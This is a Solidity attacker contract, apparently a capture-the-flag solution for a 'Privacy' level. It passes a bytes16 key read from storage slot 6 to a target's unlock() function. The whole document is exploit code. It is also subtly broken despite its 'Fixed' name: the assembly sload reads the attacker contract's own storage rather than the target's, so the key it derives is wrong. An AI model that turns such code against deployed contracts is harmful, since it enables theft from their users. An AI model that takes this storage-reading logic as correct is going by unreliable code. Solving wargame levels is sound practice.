pragma solidity ^0.8.0;

interface IPrivacy {
    function unlock(bytes16 key) external;
}

contract PrivacyAttackerFixed {
    IPrivacy private _instance;

    constructor(address target) {
        _instance = IPrivacy(target);
    }

    function exploit() public {
        bytes32 data2Slot = getDataFromSlot(6);
        bytes16 key = bytes16(data2Slot);
        _instance.unlock(key);
    }

    function getDataFromSlot(uint256 slot) internal view returns (bytes32) {
        bytes32 value;
        assembly {
            value := sload(slot)
        }
        return value;
    }
}